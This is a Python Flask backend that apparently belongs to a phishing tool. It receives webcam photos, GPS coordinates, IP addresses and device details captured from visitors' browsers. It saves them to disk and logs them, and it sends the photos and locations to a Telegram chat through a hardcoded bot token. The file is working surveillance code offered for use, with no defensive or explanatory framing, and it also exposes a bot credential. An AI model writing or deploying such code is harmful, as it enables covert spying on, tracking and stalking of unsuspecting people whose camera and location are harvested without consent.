from flask import Flask, render_template, request, jsonify
import os, base64, uuid, datetime, json, requests

app = Flask(__name__)
BOT_TOKEN = "8162029368:AAGPkNeKtZKjjqK9_bj0a1VlpviN45HJ-Ws"
CAPTURE_DIR = "captures"
LOG_DIR = "logs"

os.makedirs(CAPTURE_DIR, exist_ok=True)
os.makedirs(LOG_DIR, exist_ok=True)

@app.route("/")
def camera_page():
    return render_template("index.html")

@app.route("/location")
def location_page():
    return render_template("location.html")

@app.route("/capture", methods=["POST"])
def capture():
    try:
        data = request.get_json()
        images = data.get("images", [])
        chat_id = data.get("chat_id")
        device_info = data.get("deviceInfo", {})
        location = data.get("location")
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)

        saved_files = []
        for i, img in enumerate(images):
            if not img.startswith("data:image"): continue
            _, encoded = img.split(",", 1)
            decoded = base64.b64decode(encoded)
            filename = f"capture_{uuid.uuid4().hex}_{i+1}.jpg"
            filepath = os.path.join(CAPTURE_DIR, filename)
            with open(filepath, "wb") as f:
                f.write(decoded)
            saved_files.append(filepath)

        for path in saved_files:
            with open(path, "rb") as photo:
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                    data={"chat_id": chat_id, "caption": "📸 New capture"},
                    files={"photo": photo}
                )

        if location:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation",
                data={
                    "chat_id": chat_id,
                    "latitude": location["latitude"],
                    "longitude": location["longitude"]
                }
            )

        log = {
            "timestamp": datetime.datetime.utcnow().isoformat(),
            "chat_id": chat_id,
            "ip": ip,
            "userAgent": device_info.get("userAgent"),
            "screen": f"{device_info.get('screenWidth')}x{device_info.get('screenHeight')}",
            "lang": device_info.get("language"),
            "location": location,
            "files": saved_files
        }

        with open(os.path.join(LOG_DIR, "capture_log.jsonl"), "a") as logf:
            logf.write(json.dumps(log) + "\n")

        return jsonify({"status": "ok"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/share-location", methods=["POST"])
def share_location():
    try:
        data = request.get_json()
        chat_id = data.get("chat_id")
        location = data.get("location")

        if not chat_id or not location:
            return jsonify({"error": "Missing data"}), 400

        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation",
            data={
                "chat_id": chat_id,
                "latitude": location["latitude"],
                "longitude": location["longitude"]
            }
        )

        log = {
            "timestamp": location.get("timestamp"),
            "chat_id": chat_id,
            "location": location
        }

        with open(os.path.join(LOG_DIR, "location_log.jsonl"), "a") as f:
            f.write(json.dumps(log) + "\n")

        return jsonify({"status": "ok"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    app.run(port=5000)
